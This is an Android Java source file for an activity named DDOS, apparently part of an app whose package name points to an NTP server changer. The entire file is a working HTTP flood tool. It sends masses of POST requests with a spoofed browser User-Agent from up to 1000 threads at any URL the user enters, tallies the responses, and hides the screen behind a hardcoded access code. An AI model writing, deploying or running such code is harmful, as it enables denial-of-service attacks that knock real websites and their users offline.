package org.starx_software_lab.ntp_server_changer;

import android.annotation.SuppressLint;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;

import com.google.android.material.snackbar.Snackbar;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class DDOS extends AppCompatActivity {
    final int MSG_FROM_ACK_COUNTS = 1;
    final int MSG_FROM_ACK_ERROR = 2;
    SharedPreferences preferences;
    Button start;
    EditText target_url, single_thread, cc_thread;
    TextView ui_count, ui_200, ui_thread_error;
    int poll_sw = 0;
    int thread_countx = 0;
    int c200_countx = 0;
    int error_countx = 0;
    @SuppressLint("HandlerLeak")
    Handler updateui = new Handler() {
        @Override
        public void handleMessage(Message msg) {
            switch (msg.what) {
                case MSG_FROM_ACK_COUNTS:
                    String cc_code = msg.obj.toString().trim();
                    Log.d("CC", cc_code);
                    if (cc_code.equals("200")) {
                        c200_countx++;
                        ui_200.setText(String.valueOf(c200_countx));
                    }
                    try {
                        ui_count.setText(String.valueOf(thread_countx));
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                    break;
                case MSG_FROM_ACK_ERROR:
                    error_countx++;
                    ui_thread_error.setText(String.valueOf(error_countx));
                    //Toast.makeText(getApplicationContext(),msg.obj.toString(),Toast.LENGTH_SHORT).show();
                    break;
            }

            super.handleMessage(msg);
        }
    };
    ExecutorService es = Executors.newFixedThreadPool(1000);

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main5);
        target_url = findViewById(R.id.target_url);
        ui_count = findViewById(R.id.thread_x);
        ui_200 = findViewById(R.id.hc_200_count);
        start = findViewById(R.id.thread_start);
        single_thread = findViewById(R.id.single_thread);
        cc_thread = findViewById(R.id.cc_thread);
        ui_thread_error = findViewById(R.id.thread_error_count);
        preferences = getSharedPreferences("count", MODE_PRIVATE);
        if (preferences.getInt("DDOS_ACCESS", MODE_PRIVATE) == 0) {
            acccess_code();
        }
    }


    public void startClick(View view) {
        if (!TextUtils.isEmpty(target_url.getText()) & !TextUtils.isEmpty(single_thread.getText()) & !TextUtils.isEmpty(cc_thread.getText())) {
            if (poll_sw == 0) {
                start.setText(getString(R.string.tap_to_stop_the_thread_poll));
                if (es.isShutdown()) {
                    es = Executors.newFixedThreadPool(1000);
                }
                poll_sw = 1;
                DDOS_thread ddos_thread = new DDOS_thread();
                ddos_thread.setup(target_url.getText().toString(), Integer.parseInt(single_thread.getText().toString()));
                Snackbar.make(getWindow().getDecorView(), "Thread ready to start!", Snackbar.LENGTH_SHORT).show();
                new Thread(() -> {
                    for (int i = 0; i < Integer.parseInt(cc_thread.getText().toString()); i++) {
                        es.execute(ddos_thread);
                    }
                }).start();
                //new Thread(ddos_thread).start();
            } else {
                poll_sw = 0;
                Toast.makeText(getApplicationContext(), "准备关闭线程池..", Toast.LENGTH_SHORT).show();
                es.shutdownNow();
                start.setText(getString(R.string.start_the_thread_pool));
            }
        } else {
            Toast.makeText(getApplicationContext(), "Empty ARGS", Toast.LENGTH_SHORT).show();
        }
    }

    public void acccess_code() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("ACCESS DENIED");
        final EditText editText1 = new EditText(this);
        editText1.setHint("PLEASE ENTER THE ACCESS CODE");
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.addView(editText1);
        builder.setCancelable(false);
        builder.setView(layout);
        builder.setIcon(R.mipmap.ic_launcher);
        builder.setPositiveButton("CONFIRM", (dialogInterface, i) -> {
            if (TextUtils.isEmpty(editText1.getText())) {
                Toast.makeText(getApplicationContext(), "ACCESS CODE CAN'T BE EMPTY", Toast.LENGTH_SHORT).show();
                acccess_code();
            } else {
                if (editText1.getText().toString().trim().equals("Starxisyourfriend")) {
                    SharedPreferences.Editor editor = preferences.edit();
                    editor.putInt("DDOS_ACCESS", 1);
                    editor.apply();
                    Toast.makeText(getApplicationContext(), "ACCESS ACCEPT", Toast.LENGTH_SHORT).show();
                } else {
                    Toast.makeText(getApplicationContext(), "ACCESS DENIED", Toast.LENGTH_SHORT).show();
                    finish();
                }
            }
        });
        builder.setNegativeButton("CANCEL", (dialog, which) -> {
            Toast.makeText(getApplicationContext(), "ACCESS DENIED", Toast.LENGTH_SHORT).show();
            finish();
        });
        builder.show();
    }

    class DDOS_thread implements Runnable {
        String url = null;
        int thread_count = 0;
        URL target = null;
        HttpURLConnection working_ack = null;

        void setup(String urlx, int count) {
            this.url = urlx;
            this.thread_count = count;
            try {
                target = new URL(url);
            } catch (Exception e) {
                e.printStackTrace();
                //	Toast.makeText(getApplicationContext(),e.toString(),Toast.LENGTH_SHORT).show();
            }
        }

        public void run() {
            for (int i = 0; i < thread_count; i++) {
                thread_countx++;
                try {
                    working_ack = (HttpURLConnection) target.openConnection();
                    working_ack.setConnectTimeout(500);
                    working_ack.setInstanceFollowRedirects(false);
                    working_ack.setDoOutput(true);
                    working_ack.setUseCaches(false);
                    working_ack.setRequestMethod("POST");
                    try {
                        working_ack.setRequestProperty("Charset", "utf-8");
                        working_ack.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                        working_ack.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36");
                    } catch (Exception ignored) {
                    }
                    String post = "THIS IS A TEST!";
                    OutputStream os = working_ack.getOutputStream();
                    os.write(post.getBytes());
                    os.flush();
                    os.close();
                    Message send_status = updateui.obtainMessage();
                    send_status.what = MSG_FROM_ACK_COUNTS;
                    send_status.obj = working_ack.getResponseCode();
                    updateui.sendMessage(send_status);
                } catch (Exception e) {
                    //e.printStackTrace();
                    Message send_status = updateui.obtainMessage();
                    send_status.what = MSG_FROM_ACK_ERROR;
                    send_status.obj = e.toString();
                    updateui.sendMessage(send_status);
                }
            }
        }
    }

}
